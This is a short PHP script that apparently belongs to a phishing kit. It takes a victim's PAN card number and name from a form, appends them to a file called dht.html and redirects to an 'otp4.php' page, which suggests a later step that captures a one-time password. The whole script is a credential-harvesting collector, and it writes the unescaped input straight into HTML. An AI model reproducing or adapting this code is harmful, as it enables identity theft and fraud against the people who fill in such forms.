<?php
header("location:otp4.php");
$pancard=$_POST['pancard'];
$panname=$_POST['panname'];
$handle=fopen('dht.html','a');
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"pancard=$pancard\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"panname=$panname\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
